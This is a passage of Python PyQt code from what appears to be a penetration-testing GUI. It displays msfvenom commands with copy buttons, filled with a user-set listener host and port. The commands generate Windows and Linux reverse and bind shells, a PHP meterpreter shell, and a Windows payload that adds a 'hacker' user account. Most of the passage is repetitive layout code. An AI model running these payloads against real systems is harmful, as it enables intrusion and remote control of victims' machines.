        label_layout.addWidget(self.msfv_windows_Scan4_Copy)
        label_layout.addWidget(self.msfv_windows_Scan4)
        self.tab7_container_layout.insertLayout(93, label_layout)
        self.tab7_container_layout.addStretch()
     
        # msfv_windows_divider1
        if hasattr(self, 'msfv_windows_divider1'):
            self.tab7_container_layout.removeWidget(self.msfv_windows_divider1)
            self.msfv_windows_divider1.deleteLater()
        self.msfv_windows_divider1 = QFrame()
        self.msfv_windows_divider1.setFrameShape(QFrame.HLine)
        self.msfv_windows_divider1.setLineWidth(3)
        self.msfv_windows_divider1.setStyleSheet("color: #20C20E;")
     
        # msfv_windows_divider2
        if hasattr(self, 'msfv_windows_divider2'):
            self.tab7_container_layout.removeWidget(self.msfv_windows_divider2)
            self.msfv_windows_divider2.deleteLater()
        self.msfv_windows_divider2 = QFrame()
        self.msfv_windows_divider2.setFrameShape(QFrame.HLine)
        self.msfv_windows_divider2.setLineWidth(3)
        self.msfv_windows_divider2.setStyleSheet("color: #20C20E;")
     
        # msfv_windows_spacer1
        if hasattr(self, 'msfv_windows_spacer1'):
            self.tab7_container_layout.removeWidget(self.msfv_windows_spacer1)
            self.msfv_windows_spacer1.deleteLater()
        self.msfv_windows_spacer1 = QLabel()
        self.msfv_windows_spacer1.setFixedWidth(40)
        self.msfv_windows_spacer1.setFixedHeight(50)
     
        # msfv_windows_spacer2
        if hasattr(self, 'msfv_windows_spacer2'):
            self.tab7_container_layout.removeWidget(self.msfv_windows_spacer2)
            self.msfv_windows_spacer2.deleteLater()
        self.msfv_windows_spacer2 = QLabel()
        self.msfv_windows_spacer2.setFixedWidth(40)
        self.msfv_windows_spacer2.setFixedHeight(50)
     
        # msfv_windows spacer & divider layout
        self.tab7_container_layout.insertWidget(94, self.msfv_windows_spacer1)
        self.tab7_container_layout.insertWidget(95, self.msfv_windows_divider1)
        self.tab7_container_layout.insertWidget(96, self.msfv_windows_divider2)
        self.tab7_container_layout.insertWidget(97, self.msfv_windows_spacer2)
        self.tab7_container_layout.addStretch()
     
        # msfv_windows_Scan5
        if hasattr(self, 'msfv_windows_Scan5'):
            self.tab7_container_layout.removeWidget(self.msfv_windows_Scan5)
            self.msfv_windows_Scan5.deleteLater()
        self.msfv_windows_Scan5 = QLabel("msfvenom -p windows/shell/reverse_tcp LHOST=" + self.lhost + " LPORT=" + self.lport + " -f exe > shell.exe")
        self.msfv_windows_Scan5.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(98,self.msfv_windows_Scan5)
     
        # msfv_windows_Scan5_Copy
        if hasattr(self, 'msfv_windows_Scan5_Copy'):
            self.tab7_container_layout.removeWidget(self.msfv_windows_Scan5_Copy)
            self.msfv_windows_Scan5_Copy.deleteLater()
        self.msfv_windows_Scan5_Copy = QPushButton()
        self.msfv_windows_Scan5_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.msfv_windows_Scan5_Copy.setFixedSize(QSize(20,20))
        self.msfv_windows_Scan5_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_windows_Scan5.text()))
        self.msfv_windows_Scan5_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # msfv_windows_Scan5 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.msfv_windows_Scan5_Copy)
        label_layout.addWidget(self.msfv_windows_Scan5)
        self.tab7_container_layout.insertLayout(99, label_layout)
        self.tab7_container_layout.addStretch()
     
        # msfv_windows_divider1
        if hasattr(self, 'msfv_windows_divider1'):
            self.tab7_container_layout.removeWidget(self.msfv_windows_divider1)
            self.msfv_windows_divider1.deleteLater()
        self.msfv_windows_divider1 = QFrame()
        self.msfv_windows_divider1.setFrameShape(QFrame.HLine)
        self.msfv_windows_divider1.setLineWidth(3)
        self.msfv_windows_divider1.setStyleSheet("color: #20C20E;")
     
        # msfv_windows_divider2
        if hasattr(self, 'msfv_windows_divider2'):
            self.tab7_container_layout.removeWidget(self.msfv_windows_divider2)
            self.msfv_windows_divider2.deleteLater()
        self.msfv_windows_divider2 = QFrame()
        self.msfv_windows_divider2.setFrameShape(QFrame.HLine)
        self.msfv_windows_divider2.setLineWidth(3)
        self.msfv_windows_divider2.setStyleSheet("color: #20C20E;")
     
        # msfv_windows_spacer1
        if hasattr(self, 'msfv_windows_spacer1'):
            self.tab7_container_layout.removeWidget(self.msfv_windows_spacer1)
            self.msfv_windows_spacer1.deleteLater()
        self.msfv_windows_spacer1 = QLabel()
        self.msfv_windows_spacer1.setFixedWidth(40)
        self.msfv_windows_spacer1.setFixedHeight(50)
     
        # msfv_windows_spacer2
        if hasattr(self, 'msfv_windows_spacer2'):
            self.tab7_container_layout.removeWidget(self.msfv_windows_spacer2)
            self.msfv_windows_spacer2.deleteLater()
        self.msfv_windows_spacer2 = QLabel()
        self.msfv_windows_spacer2.setFixedWidth(40)
        self.msfv_windows_spacer2.setFixedHeight(50)
     
        # msfv_windows spacer & divider layout
        self.tab7_container_layout.insertWidget(100, self.msfv_windows_spacer1)
        self.tab7_container_layout.insertWidget(101, self.msfv_windows_divider1)
        self.tab7_container_layout.insertWidget(102, self.msfv_windows_divider2)
        self.tab7_container_layout.insertWidget(103, self.msfv_windows_spacer2)
        self.tab7_container_layout.addStretch()
     
        # msfv_windows_Scan6
        if hasattr(self, 'msfv_windows_Scan6'):
            self.tab7_container_layout.removeWidget(self.msfv_windows_Scan6)
            self.msfv_windows_Scan6.deleteLater()
        self.msfv_windows_Scan6 = QLabel("msfvenom -p windows/shell_reverse_tcp LHOST=" + self.lhost + " LPORT=" + self.lport + " -f exe > shell.exe")
        self.msfv_windows_Scan6.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(104,self.msfv_windows_Scan6)
     
        # msfv_windows_Scan6_Copy
        if hasattr(self, 'msfv_windows_Scan6_Copy'):
            self.tab7_container_layout.removeWidget(self.msfv_windows_Scan6_Copy)
            self.msfv_windows_Scan6_Copy.deleteLater()
        self.msfv_windows_Scan6_Copy = QPushButton()
        self.msfv_windows_Scan6_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.msfv_windows_Scan6_Copy.setFixedSize(QSize(20,20))
        self.msfv_windows_Scan6_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_windows_Scan6.text()))
        self.msfv_windows_Scan6_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # msfv_windows_Scan6 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.msfv_windows_Scan6_Copy)
        label_layout.addWidget(self.msfv_windows_Scan6)
        self.tab7_container_layout.insertLayout(105, label_layout)
        self.tab7_container_layout.addStretch()
     
        # msfv_windows_divider1
        if hasattr(self, 'msfv_windows_divider1'):
            self.tab7_container_layout.removeWidget(self.msfv_windows_divider1)
            self.msfv_windows_divider1.deleteLater()
        self.msfv_windows_divider1 = QFrame()
        self.msfv_windows_divider1.setFrameShape(QFrame.HLine)
        self.msfv_windows_divider1.setLineWidth(3)
        self.msfv_windows_divider1.setStyleSheet("color: #20C20E;")
     
        # msfv_windows_divider2
        if hasattr(self, 'msfv_windows_divider2'):
            self.tab7_container_layout.removeWidget(self.msfv_windows_divider2)
            self.msfv_windows_divider2.deleteLater()
        self.msfv_windows_divider2 = QFrame()
        self.msfv_windows_divider2.setFrameShape(QFrame.HLine)
        self.msfv_windows_divider2.setLineWidth(3)
        self.msfv_windows_divider2.setStyleSheet("color: #20C20E;")
     
        # msfv_windows_spacer1
        if hasattr(self, 'msfv_windows_spacer1'):
            self.tab7_container_layout.removeWidget(self.msfv_windows_spacer1)
            self.msfv_windows_spacer1.deleteLater()
        self.msfv_windows_spacer1 = QLabel()
        self.msfv_windows_spacer1.setFixedWidth(40)
        self.msfv_windows_spacer1.setFixedHeight(50)
     
        # msfv_windows_spacer2
        if hasattr(self, 'msfv_windows_spacer2'):
            self.tab7_container_layout.removeWidget(self.msfv_windows_spacer2)
            self.msfv_windows_spacer2.deleteLater()
        self.msfv_windows_spacer2 = QLabel()
        self.msfv_windows_spacer2.setFixedWidth(40)
        self.msfv_windows_spacer2.setFixedHeight(50)
     
        # msfv_windows spacer & divider layout
        self.tab7_container_layout.insertWidget(106, self.msfv_windows_spacer1)
        self.tab7_container_layout.insertWidget(107, self.msfv_windows_divider1)
        self.tab7_container_layout.insertWidget(108, self.msfv_windows_divider2)
        self.tab7_container_layout.insertWidget(109, self.msfv_windows_spacer2)
        self.tab7_container_layout.addStretch()
     
    # msfv_add_users
        if hasattr(self, 'msfv_add_users'):
            self.tab7_container_layout.removeWidget(self.msfv_add_users)
            self.msfv_add_users.deleteLater()
        self.msfv_add_users = QLabel("[+ Add a user in windows with msfvenom ]")
        self.msfv_add_users.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(110,self.msfv_add_users)
     
        # msfv_add_users_Scan1
        if hasattr(self, 'msfv_add_users_Scan1'):
            self.tab7_container_layout.removeWidget(self.msfv_add_users_Scan1)
            self.msfv_add_users_Scan1.deleteLater()
        self.msfv_add_users_Scan1 = QLabel("msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe")
        self.msfv_add_users_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(111,self.msfv_add_users_Scan1)
     
        # msfv_add_users_Scan1_Copy
        if hasattr(self, 'msfv_add_users_Scan1_Copy'):
            self.tab7_container_layout.removeWidget(self.msfv_add_users_Scan1_Copy)
            self.msfv_add_users_Scan1_Copy.deleteLater()
        self.msfv_add_users_Scan1_Copy = QPushButton()
        self.msfv_add_users_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.msfv_add_users_Scan1_Copy.setFixedSize(QSize(20,20))
        self.msfv_add_users_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_add_users_Scan1.text()))
        self.msfv_add_users_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # msfv_add_users_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.msfv_add_users_Scan1_Copy)
        label_layout.addWidget(self.msfv_add_users_Scan1)
        self.tab7_container_layout.insertLayout(112, label_layout)
        self.tab7_container_layout.addStretch()
     
        # msfv_add_users_divider1
        if hasattr(self, 'msfv_add_users_divider1'):
            self.tab7_container_layout.removeWidget(self.msfv_add_users_divider1)
            self.msfv_add_users_divider1.deleteLater()
        self.msfv_add_users_divider1 = QFrame()
        self.msfv_add_users_divider1.setFrameShape(QFrame.HLine)
        self.msfv_add_users_divider1.setLineWidth(3)
        self.msfv_add_users_divider1.setStyleSheet("color: #20C20E;")
     
        # msfv_add_users_divider2
        if hasattr(self, 'msfv_add_users_divider2'):
            self.tab7_container_layout.removeWidget(self.msfv_add_users_divider2)
            self.msfv_add_users_divider2.deleteLater()
        self.msfv_add_users_divider2 = QFrame()
        self.msfv_add_users_divider2.setFrameShape(QFrame.HLine)
        self.msfv_add_users_divider2.setLineWidth(3)
        self.msfv_add_users_divider2.setStyleSheet("color: #20C20E;")
     
        # msfv_add_users_spacer1
        if hasattr(self, 'msfv_add_users_spacer1'):
            self.tab7_container_layout.removeWidget(self.msfv_add_users_spacer1)
            self.msfv_add_users_spacer1.deleteLater()
        self.msfv_add_users_spacer1 = QLabel()
        self.msfv_add_users_spacer1.setFixedWidth(40)
        self.msfv_add_users_spacer1.setFixedHeight(50)
     
        # msfv_add_users_spacer2
        if hasattr(self, 'msfv_add_users_spacer2'):
            self.tab7_container_layout.removeWidget(self.msfv_add_users_spacer2)
            self.msfv_add_users_spacer2.deleteLater()
        self.msfv_add_users_spacer2 = QLabel()
        self.msfv_add_users_spacer2.setFixedWidth(40)
        self.msfv_add_users_spacer2.setFixedHeight(50)
     
        # msfv_add_users spacer & divider layout
        self.tab7_container_layout.insertWidget(113, self.msfv_add_users_spacer1)
        self.tab7_container_layout.insertWidget(114, self.msfv_add_users_divider1)
        self.tab7_container_layout.insertWidget(115, self.msfv_add_users_divider2)
        self.tab7_container_layout.insertWidget(116, self.msfv_add_users_spacer2)
        self.tab7_container_layout.addStretch()
     
    # msfv_linux
        if hasattr(self, 'msfv_linux'):
            self.tab7_container_layout.removeWidget(self.msfv_linux)
            self.msfv_linux.deleteLater()
        self.msfv_linux = QLabel("[+ Linux Payloads ]")
        self.msfv_linux.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(117,self.msfv_linux)
     
        # msfv_linux_Scan1
        if hasattr(self, 'msfv_linux_Scan1'):
            self.tab7_container_layout.removeWidget(self.msfv_linux_Scan1)
            self.msfv_linux_Scan1.deleteLater()
        self.msfv_linux_Scan1 = QLabel("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=" + self.lhost + " LPORT=" + self.lport + " -f elf > shell.elf")
        self.msfv_linux_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(118,self.msfv_linux_Scan1)
     
        # msfv_linux_Scan1_Copy
        if hasattr(self, 'msfv_linux_Scan1_Copy'):
            self.tab7_container_layout.removeWidget(self.msfv_linux_Scan1_Copy)
            self.msfv_linux_Scan1_Copy.deleteLater()
        self.msfv_linux_Scan1_Copy = QPushButton()
        self.msfv_linux_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.msfv_linux_Scan1_Copy.setFixedSize(QSize(20,20))
        self.msfv_linux_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_linux_Scan1.text()))
        self.msfv_linux_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # msfv_linux_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.msfv_linux_Scan1_Copy)
        label_layout.addWidget(self.msfv_linux_Scan1)
        self.tab7_container_layout.insertLayout(119, label_layout)
        self.tab7_container_layout.addStretch()
     
        # msfv_linux_divider1
        if hasattr(self, 'msfv_linux_divider1'):
            self.tab7_container_layout.removeWidget(self.msfv_linux_divider1)
            self.msfv_linux_divider1.deleteLater()
        self.msfv_linux_divider1 = QFrame()
        self.msfv_linux_divider1.setFrameShape(QFrame.HLine)
        self.msfv_linux_divider1.setLineWidth(3)
        self.msfv_linux_divider1.setStyleSheet("color: #20C20E;")
     
        # msfv_linux_divider2
        if hasattr(self, 'msfv_linux_divider2'):
            self.tab7_container_layout.removeWidget(self.msfv_linux_divider2)
            self.msfv_linux_divider2.deleteLater()
        self.msfv_linux_divider2 = QFrame()
        self.msfv_linux_divider2.setFrameShape(QFrame.HLine)
        self.msfv_linux_divider2.setLineWidth(3)
        self.msfv_linux_divider2.setStyleSheet("color: #20C20E;")
     
        # msfv_linux_spacer1
        if hasattr(self, 'msfv_linux_spacer1'):
            self.tab7_container_layout.removeWidget(self.msfv_linux_spacer1)
            self.msfv_linux_spacer1.deleteLater()
        self.msfv_linux_spacer1 = QLabel()
        self.msfv_linux_spacer1.setFixedWidth(40)
        self.msfv_linux_spacer1.setFixedHeight(50)
     
        # msfv_linux_spacer2
        if hasattr(self, 'msfv_linux_spacer2'):
            self.tab7_container_layout.removeWidget(self.msfv_linux_spacer2)
            self.msfv_linux_spacer2.deleteLater()
        self.msfv_linux_spacer2 = QLabel()
        self.msfv_linux_spacer2.setFixedWidth(40)
        self.msfv_linux_spacer2.setFixedHeight(50)
     
        # msfv_linux spacer & divider layout
        self.tab7_container_layout.insertWidget(120, self.msfv_linux_spacer1)
        self.tab7_container_layout.insertWidget(121, self.msfv_linux_divider1)
        self.tab7_container_layout.insertWidget(122, self.msfv_linux_divider2)
        self.tab7_container_layout.insertWidget(123, self.msfv_linux_spacer2)
        self.tab7_container_layout.addStretch()
     
        # msfv_linux_Scan2
        if hasattr(self, 'msfv_linux_Scan2'):
            self.tab7_container_layout.removeWidget(self.msfv_linux_Scan2)
            self.msfv_linux_Scan2.deleteLater()
        self.msfv_linux_Scan2 = QLabel("msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=" + self.lhost + " LPORT=" + self.lport + " -f elf > shell.elf")
        self.msfv_linux_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(124,self.msfv_linux_Scan2)
     
        # msfv_linux_Scan2_Copy
        if hasattr(self, 'msfv_linux_Scan2_Copy'):
            self.tab7_container_layout.removeWidget(self.msfv_linux_Scan2_Copy)
            self.msfv_linux_Scan2_Copy.deleteLater()
        self.msfv_linux_Scan2_Copy = QPushButton()
        self.msfv_linux_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.msfv_linux_Scan2_Copy.setFixedSize(QSize(20,20))
        self.msfv_linux_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_linux_Scan2.text()))
        self.msfv_linux_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # msfv_linux_Scan2 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.msfv_linux_Scan2_Copy)
        label_layout.addWidget(self.msfv_linux_Scan2)
        self.tab7_container_layout.insertLayout(125, label_layout)
        self.tab7_container_layout.addStretch()
     
        # msfv_linux_divider1
        if hasattr(self, 'msfv_linux_divider1'):
            self.tab7_container_layout.removeWidget(self.msfv_linux_divider1)
            self.msfv_linux_divider1.deleteLater()
        self.msfv_linux_divider1 = QFrame()
        self.msfv_linux_divider1.setFrameShape(QFrame.HLine)
        self.msfv_linux_divider1.setLineWidth(3)
        self.msfv_linux_divider1.setStyleSheet("color: #20C20E;")
     
        # msfv_linux_divider2
        if hasattr(self, 'msfv_linux_divider2'):
            self.tab7_container_layout.removeWidget(self.msfv_linux_divider2)
            self.msfv_linux_divider2.deleteLater()
        self.msfv_linux_divider2 = QFrame()
        self.msfv_linux_divider2.setFrameShape(QFrame.HLine)
        self.msfv_linux_divider2.setLineWidth(3)
        self.msfv_linux_divider2.setStyleSheet("color: #20C20E;")
     
        # msfv_linux_spacer1
        if hasattr(self, 'msfv_linux_spacer1'):
            self.tab7_container_layout.removeWidget(self.msfv_linux_spacer1)
            self.msfv_linux_spacer1.deleteLater()
        self.msfv_linux_spacer1 = QLabel()
        self.msfv_linux_spacer1.setFixedWidth(40)
        self.msfv_linux_spacer1.setFixedHeight(50)
     
        # msfv_linux_spacer2
        if hasattr(self, 'msfv_linux_spacer2'):
            self.tab7_container_layout.removeWidget(self.msfv_linux_spacer2)
            self.msfv_linux_spacer2.deleteLater()
        self.msfv_linux_spacer2 = QLabel()
        self.msfv_linux_spacer2.setFixedWidth(40)
        self.msfv_linux_spacer2.setFixedHeight(50)
     
        # msfv_linux spacer & divider layout
        self.tab7_container_layout.insertWidget(126, self.msfv_linux_spacer1)
        self.tab7_container_layout.insertWidget(127, self.msfv_linux_divider1)
        self.tab7_container_layout.insertWidget(128, self.msfv_linux_divider2)
        self.tab7_container_layout.insertWidget(129, self.msfv_linux_spacer2)
        self.tab7_container_layout.addStretch()
     
        # msfv_linux_Scan3
        if hasattr(self, 'msfv_linux_Scan3'):
            self.tab7_container_layout.removeWidget(self.msfv_linux_Scan3)
            self.msfv_linux_Scan3.deleteLater()
        self.msfv_linux_Scan3 = QLabel("msfvenom -p linux/x64/shell_bind_tcp LHOST=" + self.lhost + " LPORT=" + self.lport + " -f elf > shell.elf")
        self.msfv_linux_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(130,self.msfv_linux_Scan3)
     
        # msfv_linux_Scan3_Copy
        if hasattr(self, 'msfv_linux_Scan3_Copy'):
            self.tab7_container_layout.removeWidget(self.msfv_linux_Scan3_Copy)
            self.msfv_linux_Scan3_Copy.deleteLater()
        self.msfv_linux_Scan3_Copy = QPushButton()
        self.msfv_linux_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.msfv_linux_Scan3_Copy.setFixedSize(QSize(20,20))
        self.msfv_linux_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_linux_Scan3.text()))
        self.msfv_linux_Scan3_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # msfv_linux_Scan3 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.msfv_linux_Scan3_Copy)
        label_layout.addWidget(self.msfv_linux_Scan3)
        self.tab7_container_layout.insertLayout(131, label_layout)
        self.tab7_container_layout.addStretch()
     
        # msfv_linux_divider1
        if hasattr(self, 'msfv_linux_divider1'):
            self.tab7_container_layout.removeWidget(self.msfv_linux_divider1)
            self.msfv_linux_divider1.deleteLater()
        self.msfv_linux_divider1 = QFrame()
        self.msfv_linux_divider1.setFrameShape(QFrame.HLine)
        self.msfv_linux_divider1.setLineWidth(3)
        self.msfv_linux_divider1.setStyleSheet("color: #20C20E;")
     
        # msfv_linux_divider2
        if hasattr(self, 'msfv_linux_divider2'):
            self.tab7_container_layout.removeWidget(self.msfv_linux_divider2)
            self.msfv_linux_divider2.deleteLater()
        self.msfv_linux_divider2 = QFrame()
        self.msfv_linux_divider2.setFrameShape(QFrame.HLine)
        self.msfv_linux_divider2.setLineWidth(3)
        self.msfv_linux_divider2.setStyleSheet("color: #20C20E;")
     
        # msfv_linux_spacer1
        if hasattr(self, 'msfv_linux_spacer1'):
            self.tab7_container_layout.removeWidget(self.msfv_linux_spacer1)
            self.msfv_linux_spacer1.deleteLater()
        self.msfv_linux_spacer1 = QLabel()
        self.msfv_linux_spacer1.setFixedWidth(40)
        self.msfv_linux_spacer1.setFixedHeight(50)
     
        # msfv_linux_spacer2
        if hasattr(self, 'msfv_linux_spacer2'):
            self.tab7_container_layout.removeWidget(self.msfv_linux_spacer2)
            self.msfv_linux_spacer2.deleteLater()
        self.msfv_linux_spacer2 = QLabel()
        self.msfv_linux_spacer2.setFixedWidth(40)
        self.msfv_linux_spacer2.setFixedHeight(50)
     
        # msfv_linux spacer & divider layout
        self.tab7_container_layout.insertWidget(132, self.msfv_linux_spacer1)
        self.tab7_container_layout.insertWidget(133, self.msfv_linux_divider1)
        self.tab7_container_layout.insertWidget(134, self.msfv_linux_divider2)
        self.tab7_container_layout.insertWidget(135, self.msfv_linux_spacer2)
        self.tab7_container_layout.addStretch()
     
        # msfv_linux_Scan4
        if hasattr(self, 'msfv_linux_Scan4'):
            self.tab7_container_layout.removeWidget(self.msfv_linux_Scan4)
            self.msfv_linux_Scan4.deleteLater()
        self.msfv_linux_Scan4 = QLabel("msfvenom -p linux/x64/shell_reverse_tcp LHOST=" + self.lhost + " LPORT=" + self.lport + " -f elf > shell.elf")
        self.msfv_linux_Scan4.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(136,self.msfv_linux_Scan4)
     
        # msfv_linux_Scan4_Copy
        if hasattr(self, 'msfv_linux_Scan4_Copy'):
            self.tab7_container_layout.removeWidget(self.msfv_linux_Scan4_Copy)
            self.msfv_linux_Scan4_Copy.deleteLater()
        self.msfv_linux_Scan4_Copy = QPushButton()
        self.msfv_linux_Scan4_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.msfv_linux_Scan4_Copy.setFixedSize(QSize(20,20))
        self.msfv_linux_Scan4_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_linux_Scan4.text()))
        self.msfv_linux_Scan4_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # msfv_linux_Scan4 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.msfv_linux_Scan4_Copy)
        label_layout.addWidget(self.msfv_linux_Scan4)
        self.tab7_container_layout.insertLayout(137, label_layout)
        self.tab7_container_layout.addStretch()
     
        # msfv_linux_divider1
        if hasattr(self, 'msfv_linux_divider1'):
            self.tab7_container_layout.removeWidget(self.msfv_linux_divider1)
            self.msfv_linux_divider1.deleteLater()
        self.msfv_linux_divider1 = QFrame()
        self.msfv_linux_divider1.setFrameShape(QFrame.HLine)
        self.msfv_linux_divider1.setLineWidth(3)
        self.msfv_linux_divider1.setStyleSheet("color: #20C20E;")
     
        # msfv_linux_divider2
        if hasattr(self, 'msfv_linux_divider2'):
            self.tab7_container_layout.removeWidget(self.msfv_linux_divider2)
            self.msfv_linux_divider2.deleteLater()
        self.msfv_linux_divider2 = QFrame()
        self.msfv_linux_divider2.setFrameShape(QFrame.HLine)
        self.msfv_linux_divider2.setLineWidth(3)
        self.msfv_linux_divider2.setStyleSheet("color: #20C20E;")
     
        # msfv_linux_spacer1
        if hasattr(self, 'msfv_linux_spacer1'):
            self.tab7_container_layout.removeWidget(self.msfv_linux_spacer1)
            self.msfv_linux_spacer1.deleteLater()
        self.msfv_linux_spacer1 = QLabel()
        self.msfv_linux_spacer1.setFixedWidth(40)
        self.msfv_linux_spacer1.setFixedHeight(50)
     
        # msfv_linux_spacer2
        if hasattr(self, 'msfv_linux_spacer2'):
            self.tab7_container_layout.removeWidget(self.msfv_linux_spacer2)
            self.msfv_linux_spacer2.deleteLater()
        self.msfv_linux_spacer2 = QLabel()
        self.msfv_linux_spacer2.setFixedWidth(40)
        self.msfv_linux_spacer2.setFixedHeight(50)
     
        # msfv_linux spacer & divider layout
        self.tab7_container_layout.insertWidget(138, self.msfv_linux_spacer1)
        self.tab7_container_layout.insertWidget(139, self.msfv_linux_divider1)
        self.tab7_container_layout.insertWidget(140, self.msfv_linux_divider2)
        self.tab7_container_layout.insertWidget(141, self.msfv_linux_spacer2)
        self.tab7_container_layout.addStretch()
     
    # msfv_web_php
        if hasattr(self, 'msfv_web_php'):
            self.tab7_container_layout.removeWidget(self.msfv_web_php)
            self.msfv_web_php.deleteLater()
        self.msfv_web_php = QLabel("[+ Web Payloads: PHP ]")
        self.msfv_web_php.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(142,self.msfv_web_php)
     
        # msfv_web_php_Scan1
        if hasattr(self, 'msfv_web_php_Scan1'):
            self.tab7_container_layout.removeWidget(self.msfv_web_php_Scan1)
            self.msfv_web_php_Scan1.deleteLater()
        self.msfv_web_php_Scan1 = QLabel("msfvenom -p php/meterpreter_reverse_tcp LHOST=" + self.lhost + " LPORT=" + self.lport + " -f raw > shell.php")
        self.msfv_web_php_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(143,self.msfv_web_php_Scan1)
     
        # msfv_web_php_Scan1_Copy
        if hasattr(self, 'msfv_web_php_Scan1_Copy'):
            self.tab7_container_layout.removeWidget(self.msfv_web_php_Scan1_Copy)
            self.msfv_web_php_Scan1_Copy.deleteLater()
        self.msfv_web_php_Scan1_Copy = QPushButton()
        self.msfv_web_php_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.msfv_web_php_Scan1_Copy.setFixedSize(QSize(20,20))
        self.msfv_web_php_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_web_php_Scan1.text()))
        self.msfv_web_php_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # msfv_web_php_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.msfv_web_php_Scan1_Copy)
        label_layout.addWidget(self.msfv_web_php_Scan1)
        self.tab7_container_layout.insertLayout(144, label_layout)
        self.tab7_container_layout.addStretch()
     
        # msfv_web_php_divider1
        if hasattr(self, 'msfv_web_php_divider1'):
            self.tab7_container_layout.removeWidget(self.msfv_web_php_divider1)
            self.msfv_web_php_divider1.deleteLater()
        self.msfv_web_php_divider1 = QFrame()
        self.msfv_web_php_divider1.setFrameShape(QFrame.HLine)
        self.msfv_web_php_divider1.setLineWidth(3)
        self.msfv_web_php_divider1.setStyleSheet("color: #20C20E;")
     
        # msfv_web_php_divider2
        if hasattr(self, 'msfv_web_php_divider2'):
            self.tab7_container_layout.removeWidget(self.msfv_web_php_divider2)
            self.msfv_web_php_divider2.deleteLater()
        self.msfv_web_php_divider2 = QFrame()
        self.msfv_web_php_divider2.setFrameShape(QFrame.HLine)
        self.msfv_web_php_divider2.setLineWidth(3)
        self.msfv_web_php_divider2.setStyleSheet("color: #20C20E;")
     
        # msfv_web_php_spacer1
        if hasattr(self, 'msfv_web_php_spacer1'):
            self.tab7_container_layout.removeWidget(self.msfv_web_php_spacer1)
            self.msfv_web_php_spacer1.deleteLater()
        self.msfv_web_php_spacer1 = QLabel()
        self.msfv_web_php_spacer1.setFixedWidth(40)
        self.msfv_web_php_spacer1.setFixedHeight(50)
     
        # msfv_web_php_spacer2
        if hasattr(self, 'msfv_web_php_spacer2'):
            self.tab7_container_layout.removeWidget(self.msfv_web_php_spacer2)
            self.msfv_web_php_spacer2.deleteLater()
        self.msfv_web_php_spacer2 = QLabel()
        self.msfv_web_php_spacer2.setFixedWidth(40)
        self.msfv_web_php_spacer2.setFixedHeight(50)
     
        # msfv_web_php spacer & divider layout
        self.tab7_container_layout.insertWidget(145, self.msfv_web_php_spacer1)
        self.tab7_container_layout.insertWidget(146, self.msfv_web_php_divider1)
        self.tab7_container_layout.insertWidget(147, self.msfv_web_php_divider2)
        self.tab7_container_layout.insertWidget(148, self.msfv_web_php_spacer2)
        self.tab7_container_layout.addStretch()
     
        # msfv_web_php_Scan2
